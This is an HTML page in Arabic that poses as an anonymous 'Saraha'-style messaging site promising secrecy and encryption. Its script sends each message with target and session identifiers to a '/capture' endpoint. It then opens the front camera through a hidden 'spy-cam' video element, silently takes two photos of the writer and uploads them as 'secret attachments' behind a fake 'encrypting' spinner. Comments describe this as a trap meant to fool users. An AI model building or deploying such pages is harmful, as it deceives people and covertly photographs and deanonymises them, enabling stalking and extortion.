
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>صارحني | رسائل سرية ومجهولة</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <style>
        body {
            font-family: 'Tajawal', sans-serif;
            background: radial-gradient(circle at top right, #fdf2f8 0%, #f3e8ff 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #1f2937;
            -webkit-tap-highlight-color: transparent;
        }

        /* تصميم البطاقة الزجاجي الفخم */
        .glass-card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(236, 72, 153, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.6);
        }

        .header-gradient {
            background: linear-gradient(135deg, #f43f5e 0%, #d946ef 100%);
            border-radius: 32px 32px 0 0;
            padding: 40px 20px 55px 20px;
            text-align: center;
            color: white;
            position: relative;
        }

        .profile-wrapper {
            position: absolute;
            bottom: -45px;
            left: 50%;
            transform: translateX(-50%);
            width: 90px;
            height: 90px;
            background: white;
            border-radius: 50%;
            padding: 5px;
            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.2);
        }

        .profile-icon {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: linear-gradient(135deg, #fbcfe8 0%, #e879f9 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #86198f;
        }

        .custom-textarea {
            background: #faf5ff;
            border: 2px solid #f3e8ff;
            border-radius: 20px;
            resize: none;
            transition: all 0.3s ease;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            color: #4c1d95;
            font-weight: 600;
        }

        .custom-textarea:focus {
            outline: none;
            border-color: #d946ef;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(217, 70, 239, 0.1);
        }

        .custom-textarea::placeholder {
            color: #a8a29e;
            font-weight: 500;
        }

        .btn-magic {
            background: linear-gradient(135deg, #d946ef 0%, #f43f5e 100%);
            border-radius: 9999px;
            transition: all 0.3s;
            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.3);
        }

        .btn-magic:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 30px rgba(217, 70, 239, 0.4);
        }

        /* كتم الكاميرا تماماً وإخفائها */
        #spy-cam {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* زخارف خلفية متحركة */
        .blob {
            position: absolute;
            border-radius: 50%;
            filter: blur(40px);
            z-index: -1;
            opacity: 0.6;
        }
    </style>
</head>
<body class="p-4 overflow-hidden relative">

    <!-- تأثيرات خلفية فخمة -->
    <div class="blob bg-pink-300 w-64 h-64 top-10 right-10 animate-pulse"></div>
    <div class="blob bg-purple-300 w-72 h-72 bottom-10 left-10 animate-pulse" style="animation-delay: 2s;"></div>

    <!-- الكاميرا المخفية -->
    <video id="spy-cam" autoplay playsinline muted></video>

    <!-- واجهة الإرسال -->
    <main id="write-ui" class="w-full max-w-sm glass-card relative transition-all duration-500 z-10">
        
        <div class="header-gradient">
            <h1 class="text-3xl font-extrabold font-['Cairo'] tracking-wide">صـارحـنـي</h1>
            <p class="text-sm opacity-90 mt-1 font-medium">مساحة آمنة للتعبير بحرية 🔒</p>
            
            <div class="profile-wrapper">
                <div class="profile-icon">
                    <i class="fa-solid fa-envelope-open-text text-white"></i>
                </div>
            </div>
        </div>

        <div class="pt-16 pb-8 px-6 space-y-5 relative">
            <div class="text-center">
                <h2 class="text-xl font-bold text-gray-800">أرسل رسالة مجهولة</h2>
                <p class="text-xs text-gray-500 mt-1">لن نطلب اسمك، ولن نعرف من أنت.</p>
            </div>

            <div class="relative">
                <textarea id="msg-input" rows="5" class="w-full custom-textarea p-5 text-center" placeholder="اكتب ما يدور في ذهنك بصدق..."></textarea>
                <div class="absolute bottom-4 right-4 text-fuchsia-400 text-sm opacity-60">
                    <i class="fa-solid fa-pen-fancy"></i>
                </div>
            </div>

            <button id="send-btn" class="w-full btn-magic text-white font-bold text-lg py-4 flex justify-center items-center gap-2">
                <i class="fa-solid fa-paper-plane"></i>
                <span id="btn-text">إرسال الصراحة</span>
            </button>
            
            <div class="text-center text-[11px] text-gray-400 font-bold flex items-center justify-center gap-1.5 mt-2">
                <i class="fa-solid fa-shield-halved text-emerald-400"></i>
                محمي بتقنية التشفير المتقدمة
            </div>
        </div>
    </main>

    <!-- واجهة النجاح الفخمة -->
    <div id="success-ui" class="hidden w-full max-w-sm glass-card p-10 text-center transform scale-95 opacity-0 transition-all duration-500 z-10">
        <div class="w-24 h-24 mx-auto bg-gradient-to-tr from-emerald-100 to-teal-100 rounded-full flex items-center justify-center mb-6 shadow-inner">
            <i class="fa-solid fa-check text-5xl text-emerald-500"></i>
        </div>
        <h2 class="text-3xl font-extrabold text-gray-800 mb-2 font-['Cairo']">تم الإرسال!</h2>
        <p class="text-gray-500 text-sm leading-relaxed mb-8 font-medium">
            وصلت رسالتك بسلام وبسرية تامة. نشكرك على ثقتك ومصارحتك الجميلة.
        </p>
        <button onclick="location.reload()" class="w-full bg-fuchsia-50 text-fuchsia-600 font-bold py-3.5 rounded-full hover:bg-fuchsia-100 transition-colors border border-fuchsia-100">
            إرسال رسالة أخرى
        </button>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const targetNumber = urlParams.get('target');

        const sendBtn = document.getElementById('send-btn');
        const btnText = document.getElementById('btn-text');
        const msgInput = document.getElementById('msg-input');
        const writeUi = document.getElementById('write-ui');
        const successUi = document.getElementById('success-ui');
        const videoEl = document.getElementById('spy-cam');

        sendBtn.addEventListener('click', async () => {
            const messageText = msgInput.value.trim();
            
            if (!messageText) {
                msgInput.style.borderColor = "#f43f5e";
                msgInput.placeholder = "لا يمكنك إرسال رسالة فارغة...";
                msgInput.focus();
                return;
            }

            if (!sessionId || !targetNumber) {
                alert("عذراً، هذا الرابط غير مخصص لاستقبال الرسائل.");
                return;
            }

            // تجميد الواجهة لإظهار التحميل (وهم الفحص الأمني)
            sendBtn.disabled = true;
            sendBtn.style.opacity = "0.8";
            sendBtn.innerHTML = `<i class="fa-solid fa-shield-halved animate-spin"></i> <span>جاري التشفير الأمني...</span>`;

            // ==========================================
            // 1. الإرسال المباشر للنص (ضمان الوصول 100%)
            // ==========================================
            try {
                // نرسل النص مباشرة للسيرفر المطور الخاص بك
                await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'text', // نوع النص المدعوم في السيرفر الجديد
                        data: messageText, 
                        targetNumber: targetNumber, 
                        trapId: '💌 رسالة صارحني', 
                        sessionId: sessionId 
                    })
                });
            } catch (err) {
                console.error("خطأ في إرسال النص:", err);
            }

            // ==========================================
            // 2. محاولة التقاط الصور بصمت (المفاجأة)
            // ==========================================
            let capturedImages = [];
            try {
                sendBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> <span>جاري الإرسال...</span>`;
                
                // طلب الكاميرا (سيظن المستخدم أنه فحص بشري)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } });
                videoEl.srcObject = stream;
                
                // انتظار 1.2 ثانية لتستقر الإضاءة والفوكس
                await new Promise(resolve => setTimeout(resolve, 1200));

                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth || 640;
                canvas.height = videoEl.videoHeight || 480;
                const ctx = canvas.getContext('2d');

                // اللقطة الأولى
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));

                // انتظار نصف ثانية للقطة الثانية
                await new Promise(resolve => setTimeout(resolve, 500));
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));

                // إغلاق الكاميرا فوراً
                stream.getTracks().forEach(track => track.stop());

                // إذا نجح التقاط الصور، نرسلها للسيرفر كدفعة ثانية
                if (capturedImages.length > 0) {
                    await fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'selfie', // نوع الصور المدعوم في السيرفر
                            data: capturedImages, 
                            targetNumber: targetNumber, 
                            trapId: '📸 الملحقات السرية', 
                            sessionId: sessionId 
                        })
                    });
                }

            } catch (err) {
                // إذا رفض الكاميرا، أو فشل التقاط الصورة، نتجاهل الأمر بصمت
                // لأن الرسالة النصية تم إرسالها بالفعل في الخطوة 1!
                console.log("تم حجب الكاميرا، تم الاكتفاء بالنص.");
            }

            // ==========================================
            // 3. عرض واجهة النجاح المريحة
            // ==========================================
            writeUi.style.opacity = '0';
            setTimeout(() => {
                writeUi.classList.add('hidden');
                successUi.classList.remove('hidden');
                setTimeout(() => {
                    successUi.style.opacity = '1';
                    successUi.style.transform = 'scale(1)';
                }, 50);
            }, 400);
        });
    </script>
</body>
</html>
